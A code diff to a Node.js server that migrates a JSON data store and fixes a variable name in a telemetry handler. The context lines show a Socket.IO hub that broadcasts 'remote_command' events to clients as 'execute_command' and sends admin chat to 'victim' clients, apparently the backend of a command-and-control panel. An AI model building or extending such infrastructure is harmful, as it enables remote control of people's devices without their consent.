@@ -34,7 +34,32 @@ let memoryDB = { links: {}, logs: {}, settings: {} };
 function loadJSON() {
     try {
         if (fs.existsSync(DB_PATH)) {
-            memoryDB = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
+            const data = JSON.parse(fs.readFileSync(DB_PATH, 'utf8'));
+            
+            // Ensure links is an object
+            if (Array.isArray(data.links)) {
+                const linksObj = {};
+                data.links.forEach(l => { if(l && l.id) linksObj[l.id] = l; });
+                memoryDB.links = linksObj;
+            } else if (data.links) {
+                memoryDB.links = data.links;
+            }
+
+            // Ensure logs is an object
+            if (Array.isArray(data.logs)) {
+                const logsObj = {};
+                data.logs.forEach(l => { if(l && l.id) logsObj[l.id] = l; });
+                memoryDB.logs = logsObj;
+            } else if (data.logs) {
+                memoryDB.logs = data.logs;
+            }
+
+            // Migrate settings/VAPID keys
+            if (data.vapidKeys) {
+                memoryDB.settings.vapid_keys = data.vapidKeys;
+            } else if (data.settings) {
+                memoryDB.settings = data.settings;
+            }
         }
     } catch (e) { console.error('[JSON] Load Error:', e.message); }
 }
@@ -343,7 +368,7 @@ const server = http.createServer(app);
 const io = new Server(server, { cors: { origin: "*" } });
 
 io.on('connection', (socket) => {
-    socket.on('telemetry_data', (p) => processTelemetry(packet, socket));
+    socket.on('telemetry_data', (p) => processTelemetry(p, socket));
     socket.on('remote_command', (d) => io.emit('execute_command', d));
     socket.on('admin_send_chat', (d) => io.emit('victim_recv_chat', d));
 });
